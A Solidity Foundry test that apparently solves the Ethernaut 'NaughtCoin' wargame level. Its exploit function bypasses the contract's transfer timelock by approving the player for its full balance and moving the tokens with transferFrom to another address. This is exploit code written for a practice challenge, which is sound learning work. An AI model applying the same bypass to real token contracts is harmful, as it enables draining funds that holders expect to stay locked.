// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/NaughtCoin.sol";
import "../src/levels/NaughtCoinFactory.sol";
import "./utils/BaseTest.sol";

contract TestNaughtCoin is BaseTest{
    NaughtCoin level;

    constructor() public{
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = NaughtCoin(levelAddress);

        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        
       address payable receiver = utilities.getNextUserAddress();
       vm.deal(receiver,1 ether);

       uint256 totalAmount = level.balanceOf(player);
       level.approve(player,totalAmount);
        console.log('allowance:',level.allowance(player,receiver));
        level.transferFrom(player,receiver,totalAmount);

        vm.stopPrank();
        assertEq(level.balanceOf(player),0);
        assertEq(level.balanceOf(receiver),totalAmount);

    }
}
